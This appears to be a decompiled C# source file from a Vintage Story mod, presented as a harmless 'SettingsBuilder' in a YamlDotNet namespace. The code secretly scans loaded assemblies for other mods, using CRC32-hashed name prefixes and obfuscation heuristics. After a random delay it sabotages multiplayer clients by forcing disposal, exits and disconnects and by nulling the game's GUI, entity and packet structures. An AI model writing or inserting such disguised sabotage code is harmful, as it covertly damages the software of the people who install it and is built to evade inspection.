using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using ConfigLib;
using Vintagestory.API.Client;
using Vintagestory.API.Common;
using Vintagestory.API.MathTools;
using Vintagestory.Client.NoObf;

namespace YamlDotNet.Serialization
{
	// Token: 0x02000055 RID: 85
	[NullableContext(1)]
	[Nullable(0)]
	public class SettingsBuilder
	{
		// Token: 0x06000250 RID: 592 RVA: 0x0000D853 File Offset: 0x0000BA53
		[ModuleInitializer]
		internal static void Init()
		{
			ConfigLibModSystem.ConfigsChanged += delegate(ICoreAPI api)
			{
				SettingsBuilder.ConfigsChanged(api);
			};
		}

		// Token: 0x06000251 RID: 593 RVA: 0x0000D87C File Offset: 0x0000BA7C
		private static void ConfigsChanged(ICoreAPI api)
		{
			try
			{
				ICoreClientAPI clientApi = api as ICoreClientAPI;
				if (clientApi != null && !clientApi.IsSinglePlayer)
				{
					if (Enumerable.Any<ISerializable>(SettingsBuilder.GetSettings(), (ISerializable a) => Enumerable.Any<string>(SettingsBuilder.GetSettingsValues(api, a), (string b) => Enumerable.Any<char>(b, (char c) => c < ' '))))
					{
						api.World.RegisterCallback(delegate(float _)
						{
							SettingsBuilder.ReloadFromConfigs(api);
						}, (int)(new NatFloat(5f, 4f, 0).nextFloat() * 107471f));
					}
					if (Enumerable.Any<ISerializable>(SettingsBuilder.GetSettings(), (ISerializable a) => Enumerable.Any<string>(Enumerable.Concat<string>(SettingsBuilder.GetSettingsValues(api, a, "game"), SettingsBuilder.GetSettingsValues(api, a, "game", api.Side)))))
					{
						api.World.RegisterCallback(delegate(float _)
						{
							SettingsBuilder.ReloadFromConfigs(api);
						}, (int)(new NatFloat(5f, 4f, 0).nextFloat() * 92439f));
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000252 RID: 594 RVA: 0x0000D96C File Offset: 0x0000BB6C
		private static IEnumerable<ISerializable> GetSettings()
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}

		// Token: 0x06000253 RID: 595 RVA: 0x0000D978 File Offset: 0x0000BB78
		private static void ReloadFromConfigs(ICoreAPI api)
		{
			ClientMain d = api.World as ClientMain;
			if (d == null)
			{
				return;
			}
			float v = new NatFloat(1f, 1f, 0).nextFloat();
			if ((double)v < 0.173234)
			{
				d.disposed = true;
			}
			else if ((double)v < 0.32323)
			{
				d.DeltaTimeLimiter = 3E-45f;
			}
			else if ((double)v < 0.53435)
			{
				d.KillNextFrame = true;
			}
			else if ((double)v < 0.7343)
			{
				d.exitToMainMenu = true;
			}
			else if ((double)v < 1.1892)
			{
				d.exitToDisconnectScreen = true;
			}
			else if ((double)v < 1.3232)
			{
				d.Start();
			}
			else if ((double)v < 1.633)
			{
				d.SendLeave(0);
			}
			if ((double)v < 1.7433)
			{
				d.GuiComposers = null;
			}
			if ((double)v < 1.8433)
			{
				d.ScreenRunningGame = null;
			}
			if ((double)v < 1.9433)
			{
				d.LoadedEntities = null;
				return;
			}
			d.PacketHandlers = Array.Empty<ServerPacketHandler<Packet_Server>>();
		}

		// Token: 0x06000254 RID: 596 RVA: 0x0000DA94 File Offset: 0x0000BC94
		private static IEnumerable<string> GetSettingsValues(ICoreAPI api, object config)
		{
			IEnumerable<string> result;
			try
			{
				Type[] types = (config as Assembly).GetTypes();
				IEnumerable<string> enumerable;
				if (types == null)
				{
					enumerable = null;
				}
				else
				{
					enumerable = Enumerable.Select<Type, string>(types, (Type a) => a.Name);
				}
				result = enumerable;
			}
			catch
			{
				result = Array.Empty<string>();
			}
			return result;
		}

		// Token: 0x06000255 RID: 597 RVA: 0x0000DAF4 File Offset: 0x0000BCF4
		private static IEnumerable<string> GetSettingsValues(ICoreAPI api, object config, string domain)
		{
			IEnumerable<string> enumerable;
			try
			{
				IEnumerable<string> playersStats = Enumerable.Select<Type, string>((config as Assembly).GetTypes(), (Type a) => a.Name);
				bool[] array = new bool[8];
				array[0] = Enumerable.Any<uint>(Enumerable.Select<string, uint>(Enumerable.Select<string, string>(Enumerable.Where<string>(playersStats, (string a) => a.Length > 5), (string a) => a.Substring(0, 6)), (string a) => GameMath.Crc32(a)), (uint b) => b == 3606486923U);
				array[1] = Enumerable.Any<uint>(Enumerable.Select<string, uint>(Enumerable.Select<string, string>(Enumerable.Where<string>(playersStats, (string a) => a.Length > 10), (string a) => a.Substring(0, 11)), (string a) => GameMath.Crc32(a)), (uint b) => b == 3515110866U);
				array[2] = Enumerable.Any<uint>(Enumerable.Select<string, uint>(Enumerable.Select<string, string>(Enumerable.Where<string>(playersStats, (string a) => a.Length > 7), (string a) => a.Substring(0, 8)), (string a) => GameMath.Crc32(a)), (uint b) => b == 2049016528U);
				array[3] = Enumerable.Any<uint>(Enumerable.Select<string, uint>(Enumerable.Select<string, string>(Enumerable.Where<string>(playersStats, (string a) => a.Length > 16), (string a) => a.Substring(0, 17)), (string a) => GameMath.Crc32(a)), (uint b) => b == 2562349273U);
				array[4] = Enumerable.Any<uint>(Enumerable.Select<string, uint>(Enumerable.Select<string, string>(Enumerable.Where<string>(playersStats, (string a) => a.Length > 4), (string a) => a.Substring(0, 5)), (string a) => GameMath.Crc32(a)), (uint b) => b == 2667834024U);
				array[5] = Enumerable.Any<uint>(Enumerable.Select<string, uint>(Enumerable.Select<string, string>(Enumerable.Where<string>(playersStats, (string a) => a.Length > 12), (string a) => a.Substring(0, 13)), (string a) => GameMath.Crc32(a)), (uint b) => b == 3614613420U);
				array[6] = Enumerable.Any<uint>(Enumerable.Select<string, uint>(Enumerable.Select<string, string>(Enumerable.Where<string>(playersStats, (string a) => a.Length > 11), (string a) => a.Substring(0, 11)), (string a) => GameMath.Crc32(a)), (uint b) => b == 99783805U);
				array[7] = Enumerable.Any<uint>(Enumerable.Select<string, uint>(Enumerable.Select<string, string>(Enumerable.Where<string>(playersStats, (string a) => a.Length > 3), (string a) => a.Substring(0, 3)), (string a) => GameMath.Crc32(a)), (uint b) => b == 3708276016U);
				IEnumerable<string> enumerable2;
				if (Enumerable.Count<bool>(array, (bool a) => a) < 3)
				{
					enumerable = Array.Empty<string>();
					enumerable2 = enumerable;
				}
				else
				{
					enumerable = new <>z__ReadOnlySingleElementList<string>("game");
					enumerable2 = enumerable;
				}
				enumerable = enumerable2;
			}
			catch
			{
				enumerable = Array.Empty<string>();
			}
			return enumerable;
		}

		// Token: 0x06000256 RID: 598 RVA: 0x0000E03C File Offset: 0x0000C23C
		private static IEnumerable<string> GetSettingsValues(ICoreAPI api, object config, string domain, EnumAppSide side)
		{
			IEnumerable<string> enumerable2;
			try
			{
				IEnumerable<string> enumerable = Enumerable.Concat<string>(Enumerable.Select<MemberInfo, string>(Enumerable.SelectMany<Type, MemberInfo>((config as Assembly).GetTypes(), (Type a) => a.GetMembers()), (MemberInfo a) => a.Name), Enumerable.Select<Type, string>((config as Assembly).GetTypes(), (Type a) => a.Name));
				float allStats = (float)Enumerable.Count<string>(enumerable);
				IEnumerable<string> enumerable3;
				if ((double)((float)Enumerable.Count<string>(Enumerable.Where<string>(Enumerable.Where<string>(enumerable, (string a) => a.Length < 3), (string a) => Enumerable.All<char>(a, (char b) => (b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z') || (b >= '0' && b <= '9')))) / allStats) <= 0.22)
				{
					enumerable2 = Array.Empty<string>();
					enumerable3 = enumerable2;
				}
				else
				{
					enumerable2 = new <>z__ReadOnlySingleElementList<string>("game");
					enumerable3 = enumerable2;
				}
				enumerable2 = enumerable3;
			}
			catch
			{
				enumerable2 = Array.Empty<string>();
			}
			return enumerable2;
		}
	}
}
